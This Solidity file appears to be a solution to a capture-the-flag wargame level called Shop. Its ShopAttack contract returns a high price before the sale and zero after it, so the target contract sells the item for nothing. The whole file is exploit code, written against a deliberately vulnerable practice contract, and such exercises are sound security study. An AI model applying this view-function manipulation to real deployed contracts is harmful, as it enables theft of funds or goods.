// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Buyer, Shop} from "../levels/Shop.sol";

contract ShopAttack is Buyer {
    function price() external view returns (uint256) {
	Shop shop = Shop(msg.sender);
	return shop.isSold() ? 0 : 100;
    }

    function attack(address shopAddress) external {
	Shop shop = Shop(payable(shopAddress));
	shop.buy();
    }
}
